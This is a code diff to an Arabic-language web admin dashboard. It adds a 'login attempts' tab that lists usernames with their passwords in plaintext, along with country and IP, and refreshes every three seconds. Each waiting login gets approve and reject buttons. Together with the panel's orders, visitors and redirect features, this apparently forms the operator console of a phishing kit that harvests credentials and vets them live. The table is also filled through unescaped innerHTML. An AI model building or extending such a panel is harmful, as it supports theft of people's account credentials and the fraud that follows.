@@ -102,6 +102,8 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 .status-badge.rejected { background: rgba(248,113,113,0.15); color: #f87171; }
 .status-badge.blocked { background: rgba(156,163,175,0.2); color: #9ca3af; }
 .status-badge.click { background: rgba(0,200,255,0.15); color: #00c8ff; }
+.status-badge.waiting { background: rgba(251,146,60,0.15); color: #fb923c; animation: pulse-wait 2s ease-in-out infinite; }
+@keyframes pulse-wait { 0%,100%{opacity:1} 50%{opacity:0.6} }
 
 .btn-sm {
   padding: 6px 14px; border-radius: 8px; border: none; font-size: 0.8rem;
@@ -215,6 +217,10 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
       الزوار
     </a>
+    <a onclick="showTab('logins')" id="nav-logins">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      تسجيلات الدخول
+    </a>
   </nav>
 </aside>
 
@@ -322,6 +328,29 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
       </table>
     </div>
   </div>
+
+  <!-- Logins Tab -->
+  <div class="tab-content" id="tab-logins">
+    <div class="section-title">محاولات تسجيل الدخول <span class="badge" id="loginsBadge">0</span></div>
+    <div class="orders-table">
+      <table>
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>اسم المستخدم</th>
+            <th>كلمة المرور</th>
+            <th>الدولة</th>
+            <th>IP</th>
+            <th>الحالة</th>
+            <th>الإجراءات</th>
+          </tr>
+        </thead>
+        <tbody id="loginsBody">
+          <tr><td colspan="7" class="empty-msg">لا توجد محاولات تسجيل دخول</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
 </div>
 
 <script>
@@ -333,10 +362,11 @@ function showTab(tab) {
   document.querySelectorAll('.sidebar-nav a').forEach(function(a) { a.classList.remove('active'); });
   document.getElementById('tab-' + tab).classList.add('active');
   document.getElementById('nav-' + tab).classList.add('active');
-  var titles = { dashboard: 'لوحة التحكم', orders: 'قائمة الطلبات', visitors: 'الزوار' };
+  var titles = { dashboard: 'لوحة التحكم', orders: 'قائمة الطلبات', visitors: 'الزوار', logins: 'تسجيلات الدخول' };
   document.getElementById('pageTitle').textContent = titles[tab];
   if (tab === 'orders') { loadOrders(); }
   if (tab === 'visitors') loadVisitors();
+  if (tab === 'logins') loadLogins();
 }
 
 var adminToken = '';
@@ -475,6 +505,51 @@ function redirectOrder(id) {
   if (o) alert('إعادة توجيه الطلب #' + o.id + ' - ' + o.name);
 }
 
+var loginsData = [];
+
+function loadLogins() {
+  fetch('/api/login-attempts', { headers: authHeaders() }).then(checkAuth).then(function(d) {
+    if (!d) return;
+    loginsData = d.attempts || [];
+    renderLogins();
+  }).catch(function() {});
+}
+
+function renderLogins() {
+  var tb = document.getElementById('loginsBody');
+  var waiting = loginsData.filter(function(a) { return a.status === 'waiting'; }).length;
+  document.getElementById('loginsBadge').textContent = waiting > 0 ? waiting + ' بانتظار القرار' : loginsData.length + ' محاولة';
+  if (loginsData.length === 0) {
+    tb.innerHTML = '<tr><td colspan="7" class="empty-msg">لا توجد محاولات تسجيل دخول</td></tr>';
+    return;
+  }
+  tb.innerHTML = '';
+  loginsData.forEach(function(a) {
+    var sc = a.status === 'approved' ? 'approved' : a.status === 'rejected' ? 'rejected' : 'waiting';
+    var st = a.status === 'approved' ? 'مقبول' : a.status === 'rejected' ? 'مرفوض' : 'بانتظار القرار';
+    var dt = a.date ? new Date(a.date).toLocaleString('ar-AE') : '-';
+    var tr = document.createElement('tr');
+    var actions = '';
+    if (a.status === 'waiting') {
+      actions = '<button class="btn-sm btn-details" style="background:rgba(52,211,153,0.15);color:#34d399;" onclick="loginAction(' + a.id + ',\'approved\')">قبول</button><button class="btn-sm btn-details" style="background:rgba(248,113,113,0.15);color:#f87171;" onclick="loginAction(' + a.id + ',\'rejected\')">رفض</button>';
+    } else {
+      actions = '<span class="status-badge ' + sc + '">' + st + '</span>';
+    }
+    tr.innerHTML = '<td>' + a.id + '</td><td>' + (a.username || '-') + '</td><td dir="ltr" style="text-align:right;font-family:monospace;">' + (a.password || '-') + '</td><td>' + (a.country || '-') + '</td><td dir="ltr" style="text-align:right">' + (a.ip || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td>' + actions + '</td>';
+    tb.appendChild(tr);
+  });
+}
+
+function loginAction(id, status) {
+  fetch('/api/login-attempts/status', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
+    body: JSON.stringify({ id: id, status: status })
+  }).then(function() {
+    loadLogins();
+  });
+}
+
 // Init
 var now = new Date();
 var months = ['يناير','فبراير','مارس','أبريل','مايو','يونيو','يوليو','أغسطس','سبتمبر','أكتوبر','نوفمبر','ديسمبر'];
@@ -483,10 +558,12 @@ document.getElementById('currentDate').textContent = days[now.getDay()] + ' ' + 
 
 loadStats();
 loadOrders();
+loadLogins();
 
 setInterval(function() {
   loadStats();
   loadOrders();
+  loadLogins();
 }, 3000);
 
 document.getElementById('detailsModal').addEventListener('click', function(e) {
